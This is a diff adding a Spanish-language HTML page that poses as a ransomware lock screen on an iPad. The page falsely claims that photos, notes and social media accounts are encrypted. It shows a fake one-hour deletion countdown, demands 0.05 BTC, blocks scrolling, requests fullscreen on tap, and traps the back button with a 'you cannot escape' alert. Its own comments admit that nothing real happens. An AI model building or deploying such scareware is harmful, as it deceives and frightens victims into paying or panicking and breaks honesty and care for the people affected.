@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ALERTA DE SEGURIDAD CRÍTICA</title>
+    <style>
+        /* Estilo agresivo para ocupar toda la pantalla y bloquear el scroll */
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #8b0000; /* Rojo oscuro sangre */
+            color: white;
+            font-family: 'Courier New', Courier, monospace;
+            overflow: hidden; /* Intenta evitar que hagan scroll */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+
+        #container {
+            padding: 20px;
+            border: 5px solid yellow;
+            background: rgba(0,0,0,0.8);
+            max-width: 90%;
+        }
+
+        h1 {
+            color: yellow;
+            font-size: 2em;
+            text-transform: uppercase;
+            animation: blink 0.5s infinite alternate;
+        }
+
+        .skull {
+            font-size: 4em;
+            margin-bottom: 10px;
+        }
+
+        #timer {
+            font-size: 3em;
+            color: red;
+            font-weight: bold;
+            border: 2px solid red;
+            padding: 10px;
+            margin: 20px 0;
+            background: black;
+        }
+
+        .message {
+            font-size: 1.1em;
+            line-height: 1.4;
+            margin-bottom: 20px;
+        }
+
+        .highlight {
+            color: yellow;
+            font-weight: bold;
+        }
+
+        /* Animación de parpadeo para el título */
+        @keyframes blink {
+            from { opacity: 1; }
+            to { opacity: 0.5; }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="container">
+        <div class="skull">☠️</div>
+        <h1>¡Tu iPad ha sido bloqueado!</h1>
+        
+        <div class="message">
+            Todos tus archivos, fotos de la galería, notas y cuentas de redes sociales (Instagram, TikTok) han sido cifrados con una clave RSA-4096 militar.
+        </div>
+
+        <div class="message">
+            <span class="highlight">Si intentas cerrar esta ventana o apagar el dispositivo, perderás los datos para siempre.</span>
+        </div>
+
+        <div class="message">
+            Tiempo restante antes de la eliminación permanente:
+        </div>
+
+        <div id="timer">01:00:00</div>
+
+        <div class="message">
+            Para recuperar el acceso, debes enviar 0.05 BTC (aprox. 200€) a la siguiente dirección. No hay otra forma.
+        </div>
+
+    </div>
+
+    <script>
+        // Configuración del temporizador falso (empieza en 1 hora)
+        // NOTA: ¡NO hace nada real cuando llega a cero!
+        let totalSeconds = 3600; 
+
+        function updateTimer() {
+            const timerElement = document.getElementById('timer');
+            
+            if (totalSeconds <= 0) {
+                timerElement.innerHTML = "TIEMPO AGOTADO. BORRANDO...";
+                timerElement.style.color = "white";
+                clearInterval(timerInterval);
+                // Opcional: Hacer vibrar el dispositivo al final
+                if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
+                return;
+            }
+
+            let hours = Math.floor(totalSeconds / 3600);
+            let minutes = Math.floor((totalSeconds % 3600) / 60);
+            let seconds = totalSeconds % 60;
+
+            // Formato con ceros a la izquierda (01:05:09)
+            hours = hours < 10 ? '0' + hours : hours;
+            minutes = minutes < 10 ? '0' + minutes : minutes;
+            seconds = seconds < 10 ? '0' + seconds : seconds;
+
+            timerElement.innerHTML = `${hours}:${minutes}:${seconds}`;
+            totalSeconds--;
+        }
+
+        // Iniciar el contador
+        const timerInterval = setInterval(updateTimer, 1000);
+
+        // Intentar ponerlo en pantalla completa al tocar (funciona a veces en iPad)
+        document.body.addEventListener('click', function() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            } else if (document.documentElement.webkitRequestFullscreen) { /* Safari */
+                document.documentElement.webkitRequestFullscreen();
+            }
+        });
+
+        // Un truco extra: Intentar evitar que el usuario vuelva "Atrás" fácilmente
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.go(1);
+            alert("¡No puedes escapar! Tus archivos están en riesgo.");
+        };
+
+    </script>
+</body>
+</html>
